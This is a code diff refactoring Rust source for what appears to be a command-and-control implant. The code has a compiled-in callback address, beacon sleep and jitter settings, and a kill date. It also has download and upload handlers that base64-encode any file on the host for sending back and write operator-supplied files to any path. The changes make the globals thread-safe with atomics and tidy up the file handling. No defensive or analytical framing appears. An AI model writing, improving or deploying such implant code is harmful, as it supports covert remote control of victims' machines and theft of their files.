@@ -5,6 +5,7 @@ use link_common::{
 use std::env;
 use std::net::UdpSocket;
 use std::process::Command;
+use std::sync::atomic::{AtomicI64, AtomicU32, AtomicU64, Ordering};
 
 const CALLBACK: &str = env!("CALLBACK");
 
@@ -44,41 +45,37 @@ fn platform_info() -> String {
 
 // ── Sleep configuration ───────────────────────────────────────────────────────
 
-static mut SLEEP_SECONDS: u64 = 5;
-static mut JITTER_PERCENT: u32 = 0;
+static SLEEP_SECONDS: AtomicU64 = AtomicU64::new(5);
+static JITTER_PERCENT: AtomicU32 = AtomicU32::new(0);
 
 fn get_sleep_seconds() -> u64 {
-    unsafe { SLEEP_SECONDS }
+    SLEEP_SECONDS.load(Ordering::Relaxed)
 }
 
 fn get_jitter_percent() -> u32 {
-    unsafe { JITTER_PERCENT }
+    JITTER_PERCENT.load(Ordering::Relaxed)
 }
 
 fn set_sleep_seconds(seconds: u64) {
-    unsafe {
-        SLEEP_SECONDS = seconds;
-    }
+    SLEEP_SECONDS.store(seconds, Ordering::Relaxed);
 }
 
 fn set_jitter_percent(percent: u32) {
-    unsafe {
-        JITTER_PERCENT = percent.min(100);
-    }
+    JITTER_PERCENT.store(percent.min(100), Ordering::Relaxed);
 }
 
 // ── Kill date configuration ────────────────────────────────────────────────
 
-static mut KILL_DATE: Option<i64> = None; // Timestamp in seconds since UNIX_EPOCH
+/// `i64::MIN` is used as a sentinel meaning "no kill date set".
+static KILL_DATE: AtomicI64 = AtomicI64::new(i64::MIN);
 
 fn get_kill_date() -> Option<i64> {
-    unsafe { KILL_DATE }
+    let v = KILL_DATE.load(Ordering::Relaxed);
+    if v == i64::MIN { None } else { Some(v) }
 }
 
 fn set_kill_date(timestamp: Option<i64>) {
-    unsafe {
-        KILL_DATE = timestamp;
-    }
+    KILL_DATE.store(timestamp.unwrap_or(i64::MIN), Ordering::Relaxed);
 }
 
 fn should_exit() -> bool {
@@ -323,7 +320,7 @@ fn handle_killdate_command(args: &str) -> String {
         match get_kill_date() {
             Some(timestamp) => {
                 // Convert timestamp to readable date
-                if let Some(date_time) = chrono::DateTime::from_timestamp(timestamp, 0) {
+                if let Some(date_time) = chrono::DateTime::<chrono::Utc>::from_timestamp_secs(timestamp) {
                     format!(
                         "Current kill date: {}",
                         date_time.format("%Y-%m-%d %H:%M:%S")
@@ -341,7 +338,7 @@ fn handle_killdate_command(args: &str) -> String {
         // Parse date in format YYYY-MM-DD or timestamp
         if let Ok(timestamp) = args.parse::<i64>() {
             set_kill_date(Some(timestamp));
-            if let Some(date_time) = chrono::DateTime::from_timestamp(timestamp, 0) {
+            if let Some(date_time) = chrono::DateTime::<chrono::Utc>::from_timestamp_secs(timestamp) {
                 format!(
                     "[+] Kill date set to: {}",
                     date_time.format("%Y-%m-%d %H:%M:%S")
@@ -373,61 +370,33 @@ fn handle_killdate_command(args: &str) -> String {
 }
 
 fn download_file(path: &str) -> String {
-    use std::fs;
-    use std::io::Read;
-
     if path.is_empty() {
         return "[-] Usage: download <file_path>".to_string();
     }
-
-    match fs::File::open(path) {
-        Ok(mut file) => {
-            let mut buffer = Vec::new();
-            if let Err(e) = file.read_to_end(&mut buffer) {
-                return format!("[-] Failed to read file: {}", e);
-            }
-
-            // Encode file content in base64
-            let encoded = STANDARD.encode(&buffer);
-            format!("FILE:{}:{}", path, encoded)
-        }
-        Err(e) => format!("[-] Failed to open file: {}", e),
+    match std::fs::read(path) {
+        Ok(buf) => format!("FILE:{}:{}", path, STANDARD.encode(&buf)),
+        Err(e) => format!("[-] Failed to read file: {}", e),
     }
 }
 
 fn upload_file(args: &str) -> String {
-    use std::fs;
-    use std::io::Write;
-
     if args.is_empty() {
         return "[-] Usage: upload <base64_content> <destination_path>".to_string();
     }
 
-    // Parse the arguments (content and path are separated by space)
-    let parts: Vec<&str> = args.splitn(2, ' ').collect();
-    if parts.len() < 2 {
-        return "[-] Invalid upload command format".to_string();
-    }
+    let (content, path) = match args.find(' ') {
+        Some(i) => (&args[..i], args[i + 1..].trim_start()),
+        None => return "[-] Invalid upload command format".to_string(),
+    };
 
-    let content = parts[0];
-    let path = parts[1];
-
-    // Decode base64 content
     let decoded = match STANDARD.decode(content) {
         Ok(data) => data,
         Err(e) => return format!("[-] Failed to decode base64: {}", e),
     };
 
-    // Write file
-    match fs::File::create(path) {
-        Ok(mut file) => {
-            if let Err(e) = file.write_all(&decoded) {
-                format!("[-] Failed to write file: {}", e)
-            } else {
-                format!("[+] File uploaded successfully: {}", path)
-            }
-        }
-        Err(e) => format!("[-] Failed to create file: {}", e),
+    match std::fs::write(path, &decoded) {
+        Ok(()) => format!("[+] File uploaded successfully: {}", path),
+        Err(e) => format!("[-] Failed to write file: {}", e),
     }
 }
 
